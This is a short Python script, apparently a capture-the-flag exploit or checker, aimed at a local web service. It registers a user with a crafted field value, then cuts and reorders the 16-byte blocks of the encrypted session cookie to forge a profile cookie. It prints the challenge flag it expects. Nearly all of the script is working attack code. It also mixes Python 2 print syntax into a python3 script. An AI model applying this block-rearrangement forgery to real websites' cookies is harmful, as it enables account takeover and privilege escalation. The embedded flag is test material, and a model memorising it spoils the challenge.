#!/usr/bin/python3

import requests, random, string, base64

url = "http://127.0.0.1:8080"


def random_str(N):
    return ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(N)])


def alive():
    return "the fleet" in requests.get(url).text


def exploitable():
    login = random_str(17)
    passwd = random_str(19)
    data = {
        "login": login,
        "password": passwd,
        "localisation": random_str(17),
        "model": random_str(4) + "true],          " + random_str(5),
        "bw": 12345678901234
    }
    login_data = {
        "login": login,
        "password": passwd,
    }
    r = requests.post(url + "/register", data=data)
    r = requests.post(url + "/login", data=login_data, allow_redirects=False)
    original_cookie = base64.b64decode(r.cookies["data"])
    blocks = [original_cookie[i*16:(i+1)*16] for i in range(len(original_cookie)//16)]
    new_cookie = blocks[0] + blocks[2] + blocks[3] + blocks[4] + blocks[5] + blocks[6] + blocks[7] + blocks[1] + blocks[10] + blocks[11]
    cookie = {"data": base64.b64encode(new_cookie).decode('utf-8')}
    r = requests.get(url + "/profile", cookies=cookie)
    print r.text
    return 'INSA{you_shouldnt_use_YouR_0wn_cryPt0}' in r.text


if __name__ == "__main__":
    print(alive() and exploitable())
